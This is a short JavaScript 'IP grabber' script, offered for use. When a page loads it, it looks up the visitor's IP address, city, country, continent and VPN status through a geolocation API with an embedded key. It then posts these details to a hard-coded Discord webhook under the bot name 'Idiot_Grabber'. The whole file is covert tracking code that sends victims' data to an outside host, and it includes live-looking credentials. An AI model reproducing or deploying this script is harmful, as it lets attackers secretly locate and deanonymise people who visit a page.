$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=4bce3e49c8304c3ab0441a2edbc9f723", function(data) { //Make sure to use this api or use another but you got to change the values down below
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/984811579725996033/EbKuGfIfZeMajx2Ar7KDfwhBIFZ3Itz2FmEzMaXKUnh2R7uAcUOw8z_o0tjk85pyIpSK");
  
    request.setRequestHeader('Content-type', 'application/json');
  
    var t = {
      username: "Idiot_Grabber",
      avatar_url: "https://i.imgur.com/1h97XvJ_d.webp?maxwidth=760&fidelity=grand",
      content: "",
      embeds: [{
          color: "16711744",
          title: "IDIOT INFO",
          fields: [
            {name: "IP", value: data.ip_address},
            {name: "CITY", value: data.city},
            {name: "COUNTRY", value: data.country},
            {name: "CONTINENT", value: data.continent},
            {name: "VPN ?", value: data.security},
          ],
          footer: {
              text: "By KSEJNEX | nie dla psa kielbasa"
          }
      }]
  };
  
    request.send(JSON.stringify(t));
})
